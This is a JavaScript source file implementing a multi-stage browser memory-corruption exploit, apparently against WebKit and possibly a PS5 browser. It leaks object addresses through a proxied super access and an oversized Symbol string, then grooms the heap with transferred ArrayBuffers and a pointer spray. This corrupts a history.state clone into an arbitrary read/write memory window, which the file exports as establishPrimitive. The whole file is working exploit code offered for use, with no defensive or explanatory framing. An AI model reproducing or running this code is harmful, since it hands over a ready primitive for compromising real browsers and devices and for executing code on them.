const DRAIN_COUNT = 512;
const AUTO_RETRY_DELAY_MS = 50;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = 1;
const FILLER_OBJECTS = 0xfffc;
const CLONED_ARRAY_LENGTH = 0x50001;
const LEAK_STRING_LENGTH = 924176;

const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

const CARRIER_SLOTS = 9000000;

const CAPTURE_DELAY_MS = 50;
const COMPOSE_DELAY_MS = 100;

const symbolToString = Symbol.prototype.toString;

const DRAIN_SIZE = 0x10000;
const SLAB_SIZE = 0x400000;
const BUTTERFLY_HOLE_SIZE = 0x81000;
const SEPARATOR_SIZE = 0x10000;
const EARLY_HOLE_SIZE = 0x70000;
const GUARD_SIZE = 0x90000;
const PREDECESSOR_SIZE = 0x80000;
const FINAL_HOLE_SIZE = 0x80000;

const MEMORY_WINDOW_SIZE = 0x100;
const CANARY_OFFSET = 0x20;
const LEAK_SLOT_OFFSET = 0x20;

const viewHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const identityMagic = new Uint8Array([
  0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,
]);
const identityBytes = new Uint8Array(8);

let attemptNumber = 0;
let keepIndex = 0;
let keepAlive = null;
let onEvent = null;
let settleResolve = null;

let memoryView = null;
let memoryMirror = null;
let targetView = null;
const nativeTarget = parseInt;
let fakeHost = null;
let markerObjectA = null;
let targetHolder = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureError = null;

let predecessorWords = null;

let liveCandidate = null;
let barrierNode = null;
 
function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function buffer(size) {
  return new ArrayBuffer(size);
}

function allZero(bytes, start, end) {
  for (let i = start; i < end; ++i) {
    if (bytes[i] !== 0) return false;
  }
  return true;
}

function uint32At(bytes, offset) {
  const low16 = bytes[offset] + bytes[offset + 1] * 0x100;
  const high16 = bytes[offset + 2] + bytes[offset + 3] * 0x100;
  return low16 + high16 * 0x10000;
}

function low48At(bytes, offset) {
  const low32 = uint32At(bytes, offset);
  const high16 = bytes[offset + 4] + bytes[offset + 5] * 0x100;
  return low32 + high16 * 0x100000000;
}

function readBytes(destination, source, count) {
  for (let i = 0; i < count; ++i) destination[i] = source[i];
}

function sameBytes(left, right, count) {
  for (let i = 0; i < count; ++i) {
    if (left[i] !== right[i]) return false;
  }
  return true;
}

function readTwiceMatches(destination, source, count) {
  readBytes(destination, source, count);
  return sameBytes(destination, source, count);
}

function redirectView(candidate, address) {
  const high = Math.floor(address / 0x100000000);
  scratchWords[0] = address - high * 0x100000000;
  scratchWords[1] = high;
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}

function restoreView(candidate) {
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = viewHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
  if (words[offset + 3] !== 0) return NaN;
  const low32 = words[offset] + words[offset + 1] * 0x10000;
  return low32 + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
  return plausibleAddress(value) && value % 8 === 0;
}

function plausibleAddress(value) {
  return Number.isSafeInteger(value) &&
    value > 2 ** 32 &&
    value < 2 ** 48;
}

function canonicalLow48(bytes, offset) {
  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function encodedHeaderNumber() {
  const raw = new ArrayBuffer(8);
  const words = new Uint32Array(raw);
  const number = new Float64Array(raw);
  words[0] = 0x00004250;
  words[1] = 0x01062800;
  return number[0];
}

function emit(tag, detail) {
  if (onEvent !== null)
    onEvent(tag, detail === undefined ? "" : String(detail));
}

function isOurCorruptedView(candidate, originalVector) {
  if (!plausibleCell(originalVector)) return false;
  redirectView(candidate, originalVector + CANARY_OFFSET);
  readBytes(identityBytes, memoryView, 8);
  restoreView(candidate);
  return sameBytes(identityBytes, identityMagic, 8) && memoryView[0] === 0x3c;
}

function dropAttemptReferences() {
  memoryView = null;
  memoryMirror = null;
  targetView = null;
  fakeHost = null;
  markerObjectA = null;
  targetHolder = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  predecessorWords = null;
}

function releaseAttempt() {
  dropAttemptReferences();
  keepAlive = null;
  try {
    history.replaceState(null, "");
  } catch {}
}

function retry(reason, safeToRelease) {
  const nextAttempt = attemptNumber + 1;
  emit("Retry", `${reason}; attempt ${nextAttempt}`);
  if (safeToRelease) releaseAttempt();
  setTimeout(() => {
    attemptNumber = nextAttempt;
    startAttempt();
  }, safeToRelease ? 750 : AUTO_RETRY_DELAY_MS);
}

function finishEarlySafeAttempt(reason, detail = "") {
  retry(detail ? `${reason}: ${detail}` : reason, true);
}
 
function resetAttemptState() {
  dropAttemptReferences();
  copiedLength = 0;
  captureError = null;
  keepIndex = 0;
  keepAlive = [];
  identityBytes.fill(0);
  liveCandidate = null;
  viewHeader.fill(0);
  targetHeader.fill(0);
  holderHeader.fill(0);
}

function startAttempt() {
  resetAttemptState();
  emit("Attempt", String(attemptNumber));
  try {
    storeHistoryGraph();
    for (let i = 0; i < 8; ++i)
      memoryView[CANARY_OFFSET + i] = identityMagic[i];
    prepareAddressLeak();
  } catch (error) {
    finishEarlySafeAttempt(
      "setup failed",
      `${error?.name}: ${String(error?.message).slice(0, 80)}`,
    );
  }
}

// Address-leak helper
function leakScopeObject() {
  class Leaker {
    leak() {
      return super.foo;
    }
  }
  Leaker.prototype.__proto__ = new Proxy(
    {},
    {
      get: function (target, property, receiver) {
        return receiver;
      },
    },
  );
  const leak = Leaker.prototype.leak;
  return (function () {
    return leak();
  })();
}

function prepareSymbolWrapper(getter) {
  leakedScope = leakScopeObject();
  if (leakedScope === undefined || leakedScope === null)
    throw new Error("scope-not-leaked");

  for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;

  Object.defineProperty(leakedScope, "g", {
    get: getter,
    configurable: true,
  });
  return Object(leakedScope.g);
}

// Stage 1: build the objects later reached through the corrupted clone.
function prepareExploitObjects() {
  const memoryBuffer = new ArrayBuffer(MEMORY_WINDOW_SIZE);
  memoryView = new Uint8Array(memoryBuffer);
  memoryMirror = new Uint8Array(memoryBuffer);
  memoryMirror[0] = 0x3c;

  const targetBuffer = new ArrayBuffer(0x20);
  targetView = new Uint8Array(targetBuffer);
  targetView[0] = 0xa5;
  const lengthWord = { keep: 0x51515151 };

  fakeHost = {
    q0: encodedHeaderNumber(),
    q1: 1.1,
    q2: memoryView,
    q3: lengthWord,
    q4: 2.2,
    q5: 3.3,
  };

  delete fakeHost.q1;
  delete fakeHost.q4;
  delete fakeHost.q5;

  if (
    !Number.isFinite(fakeHost.q0) ||
    fakeHost.q2 !== memoryView ||
    fakeHost.q3 !== lengthWord ||
    memoryView[0] !== 0x3c ||
    targetView[0] !== 0xa5 ||
    typeof nativeTarget !== "function"
  )
    throw new Error("fake-host-shape-failed");

  const anchorElement = document.createElement("textarea");
  markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
  const markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
  const holderGuardA = { marker: 0x484f4c44 };
  const holderGuardB = { marker: 0x47554152 };
  targetHolder = {
    q0: nativeTarget,
    q1: anchorElement,
    q2: markerObjectA,
    q3: markerObjectB,
    q4: holderGuardA,
    q5: holderGuardB,
  };

  if (
    targetHolder.q0 !== nativeTarget ||
    targetHolder.q1 !== anchorElement ||
    targetHolder.q2 !== markerObjectA ||
    targetHolder.q3 !== markerObjectB ||
    targetHolder.q4 !== holderGuardA ||
    targetHolder.q5 !== holderGuardB ||
    anchorElement === null ||
    typeof anchorElement !== "object" ||
    markerObjectA.marker !== 0x4d41524b ||
    markerObjectB.marker !== 0x4d41524c
  )
    throw new Error("probe-holder-shape-failed");
}

function storeHistoryGraph() {
  const referenceTarget = {
    marker: 0x51515151,
    kind: "serialized-reference",
  };
  prepareExploitObjects();

  const fillerGraph = new Array(0xfffd);
  let pos = 0;
  const huge = 1n << 40n;
  for (let i = 0; i < FILLER_BIGINTS; i++)
    fillerGraph[pos++] = huge + BigInt(i);
  for (let i = 0; i < FILLER_OBJECTS; i++) fillerGraph[pos++] = {};

  outerGraph = new Array(CONTROL_INDEX + 1);
  outerGraph[0] = fillerGraph;
  outerGraph[1] = referenceTarget;
  outerGraph[2] = referenceTarget;
  outerGraph[CONTROL_INDEX] = CONTROL_INT;
 
  history.replaceState(outerGraph, "");
}

// Stage 2: leak fakeHost and targetHolder through the oversized Symbol string.
function prepareAddressLeak() {
  capturedWords = new Uint16Array(16);
  getterCarrier = function getterCarrierFunction() {
    return 7;
  };

  getterCarrier[0] = fakeHost;
  for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
  getterCarrier[1] = targetHolder;
  getterCarrier[2] = fakeHost;
  getterCarrier[3] = targetHolder;
  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
  emit("Preparing address leak", `${CARRIER_SLOTS} slots`);

  setTimeout(captureAddresses, CAPTURE_DELAY_MS);
  setTimeout(finishAddressLeak, COMPOSE_DELAY_MS);
}

function captureAddresses() {
  try {
    capturedString = symbolToString.call(preparedSymbolObject);
    copiedLength = capturedString.length;
    if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) {
      capturedString = null;
      return;
    }
    for (let i = 0; i < 16; i++)
      capturedWords[i] = capturedString.charCodeAt(7 + i);
  } catch (error) {
    captureError = error;
  }
}

// Stage 3 helper: fill the reclaimed predecessor allocation with fakeHost.
function fillPointerSpray(backing, pointer) {
  const high = Math.floor(pointer / 0x100000000);
  const low = pointer - high * 0x100000000;

  if (
    !plausibleCell(pointer) ||
    high < 0 ||
    high > 0xffff ||
    Math.floor(low) !== low ||
    low < 0 ||
    low > 0xffffffff ||
    low + high * 0x100000000 !== pointer
  )
    throw new Error("invalid-low48-fake-address");

  predecessorWords = new Uint32Array(backing);
  for (let i = 0; i < predecessorWords.length; i += 2) {
    predecessorWords[i] = low;
    predecessorWords[i + 1] = high;
  }

  const last = predecessorWords.length - 2;
  if (
    predecessorWords[0] !== low ||
    predecessorWords[1] !== high ||
    predecessorWords[last] !== low ||
    predecessorWords[last + 1] !== high
  )
    throw new Error("pointer-fill-verification-failed");
}

function clearPointerSpray() {
  if (predecessorWords !== null) predecessorWords.fill(0);
}

function invalidClone(reason, safe) {
  clearPointerSpray();
  return { status: "invalid", safe, reason };
}

function validStructure(header) {
  const id = uint32At(header, 0);
  return id >= 0x100 && id < 0x08000000;
}

function inspectViewHeader() {
  const vector = low48At(viewHeader, 0x10);

  if (
    !validStructure(viewHeader) ||
    !plausibleAddress(low48At(viewHeader, 0x08)) ||
    !plausibleAddress(vector) ||
    uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE ||
    !allZero(viewHeader, 0x20, 0x28)
  )
    return null;

  return vector;
}

function makeUpgradedHeader() {
  for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i];

  if (scratchBytes[6] >= 2) {
    scratchBytes[6] -= 2;
  } else {
    scratchBytes[6] = (scratchBytes[6] + 0xfe) & 0xff;
    scratchBytes[7] = (scratchBytes[7] - 1) & 0xff;
  }

  const value = scratchDouble[0];
  return Number.isFinite(value) ? value : null;
}

function inspectHolder(candidate, holderAddress) {
  redirectView(candidate, holderAddress);
  if (!readTwiceMatches(holderHeader, memoryView, HOLDER_BYTES)) return null;

  let functionAddress = null;
  for (let offset = 0x10; offset <= 0x38; offset += 8) {
    const address = low48At(holderHeader, offset);
    if (!canonicalLow48(holderHeader, offset) || !plausibleCell(address))
      return null;
    if (offset === 0x10) functionAddress = address;
  }

  return functionAddress;
}

function inspectFunction(candidate, address) {
  redirectView(candidate, address);
  readBytes(targetHeader, memoryView, FUNCTION_BYTES);

  const executable = low48At(targetHeader, 0x18);

  if (
    !validStructure(targetHeader) ||
    !plausibleAddress(low48At(targetHeader, 0x08)) ||
    !plausibleAddress(low48At(targetHeader, 0x10)) ||
    !plausibleCell(executable)
  )
    return null;

  return { executable, type: targetHeader[5] };
}

function inspectNativeExecutable(candidate, address) {
  redirectView(candidate, address);
  readBytes(targetHeader, memoryView, NATIVE_EXECUTABLE_BYTES);

  const nativeFunction = low48At(targetHeader, 0x28);
  const nativeConstructor = low48At(targetHeader, 0x30);
  if (
    !validStructure(targetHeader) ||
    !canonicalLow48(targetHeader, 0x28) ||
    !canonicalLow48(targetHeader, 0x30) ||
    !plausibleAddress(nativeFunction) ||
    !plausibleAddress(nativeConstructor) ||
    nativeFunction === nativeConstructor
  )
    return null;

  return {
    nativeFunction,
    nativeConstructor,
    type: targetHeader[5],
  };
}

function rejectRedirected(candidate, reason) {
  restoreView(candidate);
  return invalidClone(reason, false);
}

// Stage 4: history.state should now return a corrupted Uint8Array.
function inspectClonedGraph(holderAddress) {
  let clone = null;
  let candidate = null;
  let headerRead = false;
  let vectorRedirected = false;

  try {
    clone = history.state;
    if (clone.length !== CLONED_ARRAY_LENGTH) {
      clone[DUPLICATE_INDEX] = undefined;
      return invalidClone("unexpected clone length", true);
    }

    if (clone[1] === clone[DUPLICATE_INDEX]) {
      clone[DUPLICATE_INDEX] = undefined;
      clearPointerSpray();
      return { status: "unchanged", safe: true };
    }

    candidate = clone[DUPLICATE_INDEX];
    clone[DUPLICATE_INDEX] = undefined;
    clone = null;

    readBytes(viewHeader, candidate, CELL_BYTES);
    headerRead = true;

    const originalVector = inspectViewHeader();
    if (originalVector === null) {
      const safe = allZero(viewHeader, 0, CELL_BYTES) && !vectorRedirected;
      return invalidClone("invalid view header", safe);
    }

    vectorRedirected = true;
    const identityProved = isOurCorruptedView(candidate, originalVector);
    vectorRedirected = false;
    if (!identityProved) return invalidClone("wrong corrupted view", false);

    const newHeader = makeUpgradedHeader();
    if (newHeader === null) return invalidClone("invalid view flags", false);

    fakeHost.q0 = newHeader;
    if (fakeHost.q0 !== newHeader) return invalidClone("header update failed", false);

    vectorRedirected = true;
    const nativeTargetAddress = inspectHolder(candidate, holderAddress);
    if (nativeTargetAddress === null)
      return rejectRedirected(candidate, "invalid holder layout");

    const functionInfo = inspectFunction(candidate, nativeTargetAddress);
    if (functionInfo === null)
      return rejectRedirected(candidate, "invalid function layout");

    const nativeInfo = inspectNativeExecutable(candidate, functionInfo.executable);
    if (nativeInfo === null)
      return rejectRedirected(candidate, "invalid executable layout");

    globalThis.__ps5NativeCtor = nativeInfo.nativeConstructor;

    redirectView(candidate, nativeTargetAddress);
    const functionMatches =
      low48At(memoryView, 0x18) === functionInfo.executable &&
      memoryView[5] === functionInfo.type;

    redirectView(candidate, functionInfo.executable);
    const nativeMatches =
      low48At(memoryView, 0x28) === nativeInfo.nativeFunction &&
      low48At(memoryView, 0x30) === nativeInfo.nativeConstructor &&
      memoryView[5] === nativeInfo.type;

    restoreView(candidate);
    vectorRedirected = false;
    if (
      !functionMatches ||
      !nativeMatches ||
      memoryView[0] !== 0x3c ||
      memoryMirror[0] !== 0x3c ||
      targetView[0] !== 0xa5
    ) {
      return invalidClone("pointer check failed", false);
    }

    liveCandidate = candidate;
    clearPointerSpray();
    return { status: "ready", originalVector, nativeInfo };
  } catch (error) {
    const safe =
      candidate === null &&
      clone === null &&
      !headerRead &&
      error?.name === "TypeError";
    if (clone !== null) {
      try {
        clone[DUPLICATE_INDEX] = undefined;
      } catch {}
    }
    if (candidate !== null && headerRead && vectorRedirected) {
      try {
        restoreView(candidate);
      } catch {}
    }
    try {
      targetView[0] = 0xa5;
      memoryMirror[0] = 0x3c;
    } catch {}
    try {
      clearPointerSpray();
    } catch {}
    return { status: "error", safe, error };
  }
}

// Stage 3: create the required holes, spray fakeHost, then run history.state.
function groomHeap(fakeAddress, holderAddress) {
  emit("Heap grooming", `${DRAIN_COUNT} buffers`);
  let outcome;
  try {
    const channel = new MessageChannel();
    channel.port1.close();
    channel.port2.close();

    for (let i = 0; i < DRAIN_COUNT; i++)
      keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

    let slab = buffer(SLAB_SIZE);
    channel.port1.postMessage(0, [slab]);
    slab = null;

    const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
    const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
    const separator = buffer(SEPARATOR_SIZE);
    const earlyHole = buffer(EARLY_HOLE_SIZE);
    const guard = buffer(GUARD_SIZE);
    const predecessor = buffer(PREDECESSOR_SIZE);
    const finalHole = buffer(FINAL_HOLE_SIZE);

    fillPointerSpray(predecessor, fakeAddress);
    keepAlive[keepIndex++] = separator;
    keepAlive[keepIndex++] = guard;
    keepAlive[keepIndex++] = predecessor;

    criticalLoadBarrier(fakeAddress, holderAddress);

    channel.port1.postMessage(0, [
      butterflyHole1,
      butterflyHole2,
      earlyHole,
      finalHole,
    ]);
    outcome = inspectClonedGraph(holderAddress);
  } catch (error) {
    try {
      clearPointerSpray();
    } catch {}
    outcome = { status: "error", safe: true, error };
  }
  finishAttempt(outcome, holderAddress);
}

function prepareCriticalLoadBarrier() {
  if (barrierNode !== null) return;
  try {
    barrierNode = document.createElement("div");
    barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
    document.body.appendChild(barrierNode);
  } catch {
    barrierNode = null;
  }
}

function criticalLoadBarrier(fake, target) {
  // This layout/Blob/storage activity is part of the working heap layout.
  // Keep it immediately before the four hole buffers are transferred.
  try {
    const line = `fake=${hex(fake)}-target=${hex(target)}`;
    if (barrierNode !== null) {
      barrierNode.textContent = line;
      void barrierNode.offsetWidth;
    }
    void new Blob([line], { type: "text/plain" });
    sessionStorage.setItem("webkit:critical-load", line);
  } catch {}
}

function finishAddressLeak() {
  if (captureError !== null)
    return finishEarlySafeAttempt(
      "address leak failed",
      `${captureError?.name}: ${String(captureError?.message).slice(0, 80)}`,
    );
  if (copiedLength === 0)
    return finishEarlySafeAttempt("address leak did not finish");
  if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff))
    return finishEarlySafeAttempt(
      "unexpected copy length",
      `got ${copiedLength}, expected ${LEAK_STRING_LENGTH}`,
    );

  const hostAddress = pointerFromWords(capturedWords, 0);
  const holderAddress = pointerFromWords(capturedWords, 4);
  if (
    hostAddress !== pointerFromWords(capturedWords, 8) ||
    holderAddress !== pointerFromWords(capturedWords, 12) ||
    hostAddress === holderAddress ||
    !plausibleCell(hostAddress) ||
    !plausibleCell(holderAddress)
  ) return finishEarlySafeAttempt("invalid leaked addresses");

  const fakeAddress = hostAddress + 0x10;
  if (!plausibleCell(fakeAddress))
    return finishEarlySafeAttempt("invalid fake object address", hex(hostAddress));
  emit(
    "Address leak",
    `host=${hex(hostAddress)} holder=${hex(holderAddress)} fake=${hex(fakeAddress)}`,
  );
  groomHeap(fakeAddress, holderAddress);
}

// Stage 5: retry placement misses or publish the validated memory window.
function finishAttempt(outcome, holderAddress) {
  if (outcome.status === "error") {
    emit("Failed", String(outcome.error?.message || outcome.error));
    return retry("heap placement failed", outcome.safe);
  }

  if (outcome.status === "unchanged")
    return retry("clone was not corrupted", true);

  if (outcome.status === "invalid")
    return retry(outcome.reason, outcome.safe);

  if (outcome.status !== "ready" || liveCandidate === null) {
    emit("Failed", "memory window validation failed");
    liveCandidate = null;
    return retry("memory window validation failed", false);
  }

  emit("Corrupted view", `vector=${hex(outcome.originalVector)} holder=${hex(holderAddress)}`);
  emit("Native pointers", `function=${hex(outcome.nativeInfo.nativeFunction)} constructor=${hex(outcome.nativeInfo.nativeConstructor)}`);

  try {
    history.replaceState(null, "");
  } catch {}

  const resolve = settleResolve;
  settleResolve = null;
  if (resolve !== null) resolve(createMemoryWindow(holderAddress));
}

function createMemoryWindow(holderAddress) {
  return {
    setAddress(address) {
      if (liveCandidate === null)
        throw new Error("memory window is no longer live");
      if (!plausibleAddress(address))
        throw new RangeError(`invalid address ${address}`);
      redirectView(liveCandidate, address);
    },
    resetAddress() {
      if (liveCandidate === null)
        throw new Error("memory window is no longer live");
      restoreView(liveCandidate);
    },
    bytes: memoryView,
    size: MEMORY_WINDOW_SIZE,
    leakAddress: holderAddress + LEAK_SLOT_OFFSET,
    setLeakObject(value) {
      targetHolder.q2 = value;
    },
    clearLeakObject() {
      targetHolder.q2 = markerObjectA;
    },
  };
}

export function establishPrimitive(eventHandler = null) {
  if (settleResolve !== null)
    return Promise.reject(new Error("core: already running"));
  if (
    typeof BigInt !== "function" ||
    typeof MessageChannel !== "function" ||
    typeof Symbol !== "function" ||
    typeof history === "undefined" ||
    typeof history.replaceState !== "function"
  )
    return Promise.reject(new Error("core: unsupported browser"));

  onEvent = typeof eventHandler === "function" ? eventHandler : null;

  prepareCriticalLoadBarrier();
  attemptNumber = 1;

  return new Promise((resolve) => {
    settleResolve = resolve;
    startAttempt();
  });
}